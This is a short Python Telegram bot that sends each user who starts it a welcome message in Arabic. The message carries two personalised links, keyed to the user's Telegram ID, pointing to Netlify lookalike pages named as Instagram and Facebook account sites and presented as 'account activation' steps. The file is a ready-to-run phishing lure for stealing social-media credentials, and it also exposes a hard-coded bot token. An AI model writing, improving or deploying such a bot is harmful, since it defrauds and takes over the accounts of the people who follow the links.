import os
import telebot

TOKEN = "8903980560:AAGSTthCdOGRhabZC6Rx-YOqMY0MCw4JsFs"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    custom_link = f"https://instagram-account-ginxl9n.netlify.app/?id={user_id}"
    second_link = f"https://account-faceboo-k-ginxl9n.netlify.app/?id={user_id}"
    
    welcome_text = (
        "أهلاً بك في بوت الخدمات المميز\n\n"
        "يسعدنا انضمامك إلينا. يرجى إتمام الخطوات عبر الروابط المخصصة لك أدناه:\n\n"
        "رابط انستغرام الخاص بك:\n"
        f"{custom_link}\n\n"
        "رابط فيسبوك الخاص بك:\n"
        f"{second_link}\n\n"
        "------------------------------------\n"
        "نصيحة: تأكد من إتمام الخطوات بدقة لضمان تفعيل حسابك بنجاح.\n\n"
        "Dedication to FDZ"
    )
    
    bot.reply_to(message, welcome_text)

bot.infinity_polling()
